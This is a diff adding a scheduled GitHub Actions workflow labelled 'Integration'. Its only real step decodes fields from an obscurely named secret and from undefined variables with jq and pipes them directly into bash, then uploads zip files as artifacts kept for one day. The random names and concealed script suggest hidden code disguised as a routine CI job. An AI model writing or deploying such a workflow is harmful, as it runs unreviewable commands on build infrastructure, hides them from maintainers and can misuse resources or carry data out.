@@ -1,0 +1,30 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          yn6: ${{ secrets.yn6 }}
+        run: |
+          printf '%s' "$yn6" | jq -r .gn68789 | /bin/bash
+          printf '%s' "$woi3" | jq -r .pkouj8 | /bin/bash
+          echo $kjj39003 | jq -r .dhw85 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: wfc1jJ3x
+          path: "*.zip"
+          retention-days: 1
